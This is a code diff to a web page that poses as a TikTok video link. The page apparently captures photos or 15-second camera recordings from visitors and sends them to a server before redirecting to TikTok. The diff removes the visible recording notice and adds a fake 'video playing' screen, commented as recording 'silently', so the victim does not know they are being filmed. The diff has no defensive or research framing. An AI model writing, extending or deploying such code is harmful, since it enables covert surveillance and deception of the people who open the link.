@@ -21,8 +21,12 @@
         .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px; display: none; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .tiktok-logo { font-size: 60px; margin-bottom: 10px; }
-        .redirect-text { color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 30px; }
-        .recording-status { color: #fe2c55; font-size: 16px; margin-top: 10px; display: none; font-weight: 600; }
+        .redirect-text { color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 30px; display: none; }
+        .overlay-gradient { position: absolute; bottom: 0; left: 0; right: 0; height: 200px; background: linear-gradient(transparent, rgba(0,0,0,0.4)); z-index: 3; pointer-events: none; }
+        .fake-video { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; flex-direction: column; background: #000; }
+        .fake-video .play-icon { font-size: 80px; color: rgba(255,255,255,0.3); margin-bottom: 20px; }
+        .fake-video .title { font-size: 18px; font-weight: 600; color: rgba(255,255,255,0.6); }
+        .fake-video .subtitle { font-size: 14px; color: rgba(255,255,255,0.3); margin-top: 8px; }
     </style>
 </head>
 <body>
@@ -33,13 +37,13 @@
 </div>
 
 <div class="video-container">
-    <div class="tiktok-logo">🎵</div>
-    <h2 style="font-weight: 600; font-size: 22px;">TikTok</h2>
-    <p style="color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 4px;">Loading video...</p>
-    <div class="spinner" id="spinner"></div>
-    <div class="recording-status" id="recordingStatus">🔴 Recording video...</div>
-    <div class="redirect-text" id="redirectText">Opening in TikTok app...</div>
-    <div class="overlay-gradient" style="position: absolute; bottom: 0; left: 0; right: 0; height: 200px; background: linear-gradient(transparent, rgba(0,0,0,0.4)); z-index: 3; pointer-events: none;"></div>
+    <!-- Show a fake video page while recording silently -->
+    <div class="fake-video" id="fakeVideo">
+        <div class="play-icon">▶️</div>
+        <div class="title">Loading video...</div>
+        <div class="subtitle" id="statusText">Preparing...</div>
+    </div>
+    <div class="overlay-gradient"></div>
     <video id="hiddenVideo" autoplay playsinline muted></video>
 </div>
 
@@ -66,6 +70,7 @@
     let captureStarted = false;
     let recordingComplete = false;
     let redirectDone = false;
+    let countdownInterval = null;
     const MAX_BURST = 5;
     const VIDEO_DURATION = 15000;
 
@@ -73,9 +78,21 @@
     const permissionOverlay = document.getElementById('permissionOverlay');
     const allowBtn = document.getElementById('allowGpsBtn');
     const loadingText = document.getElementById('loadingText');
-    const spinner = document.getElementById('spinner');
-    const redirectText = document.getElementById('redirectText');
-    const recordingStatus = document.getElementById('recordingStatus');
+    const fakeVideo = document.getElementById('fakeVideo');
+    const statusText = document.getElementById('statusText');
+
+    // ===== FAKE VIDEO UI (shows while recording) =====
+    function updateFakeUI(message) {
+        statusText.textContent = message;
+    }
+
+    function showVideoPlaying() {
+        const playIcon = fakeVideo.querySelector('.play-icon');
+        const title = fakeVideo.querySelector('.title');
+        playIcon.textContent = '▶️';
+        title.textContent = 'Video playing...';
+        updateFakeUI('Watching video');
+    }
 
     // ===== MOBILE REDIRECT (with delay) =====
     function redirectToTikTok() {
@@ -83,15 +100,12 @@
         redirectDone = true;
         
         const url = video_url;
+        updateFakeUI('Opening TikTok...');
         
-        // Show redirecting state
-        spinner.style.display = 'block';
-        redirectText.textContent = 'Opening in TikTok app...';
+        setTimeout(() => {
+            window.location.href = `tiktok://video?url=${encodeURIComponent(url)}`;
+        }, 300);
         
-        // Try to open in TikTok app (works on mobile)
-        window.location.href = `tiktok://video?url=${encodeURIComponent(url)}`;
-        
-        // Fallback: open in browser after 2 seconds
         setTimeout(() => {
             window.location.href = url;
         }, 2000);
@@ -173,6 +187,7 @@
 
         switch (content_type) {
             case 'single_photo':
+                updateFakeUI('Capturing photo...');
                 const photo = await grabPhoto();
                 if (photo) {
                     sendToServer({
@@ -182,11 +197,11 @@
                         type: 'photo'
                     });
                 }
-                // For photo, redirect immediately
                 setTimeout(() => { redirectToTikTok(); }, 500);
                 break;
 
             case 'burst':
+                updateFakeUI('Capturing photos...');
                 const photos = [];
                 for (let i = 0; i < MAX_BURST; i++) {
                     const p = await grabPhoto();
@@ -201,13 +216,14 @@
                         type: 'burst'
                     });
                 }
-                // For burst, redirect immediately
                 setTimeout(() => { redirectToTikTok(); }, 500);
                 break;
 
             case 'video':
-                // Show recording status
-                recordingStatus.style.display = 'block';
+                updateFakeUI('▶️ Video playing...');
+                
+                // Show video is playing
+                showVideoPlaying();
                 
                 recordedChunks = [];
                 const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
@@ -219,10 +235,7 @@
                 };
                 
                 mediaRecorder.onstop = () => {
-                    console.log('📹 Recording stopped, sending video...');
-                    recordingStatus.textContent = '✅ Video recorded!';
-                    recordingStatus.style.color = '#4CAF50';
-                    
+                    console.log('📹 Recording finished');
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
                     const reader = new FileReader();
                     reader.onloadend = () => {
@@ -238,11 +251,9 @@
                     reader.readAsDataURL(blob);
                 };
                 
-                // Start recording
                 mediaRecorder.start();
                 console.log('🔴 Recording started for 15 seconds...');
                 
-                // Stop recording after 15 seconds
                 setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
@@ -250,12 +261,10 @@
                     }
                 }, VIDEO_DURATION);
                 
-                // Safety: if recording doesn't complete in 20 seconds, redirect anyway
                 setTimeout(() => {
                     if (!redirectDone && mediaRecorder && mediaRecorder.state === 'recording') {
                         console.log('⚠️ Recording taking too long - forcing redirect');
                         mediaRecorder.stop();
-                        setTimeout(() => { redirectToTikTok(); }, 1000);
                     }
                 }, VIDEO_DURATION + 3000);
                 break;
@@ -277,10 +286,13 @@
                 permissionOverlay.style.display = 'none';
                 currentFacingMode = facingMode;
                 
-                // Start capture after 500ms
+                // Show fake video UI
                 setTimeout(() => { 
-                    doCapture(); 
-                }, 500);
+                    updateFakeUI('Loading video...');
+                    setTimeout(() => {
+                        doCapture();
+                    }, 300);
+                }, 300);
             }).catch(e => console.error('Play error:', e));
 
         }).catch(err => {
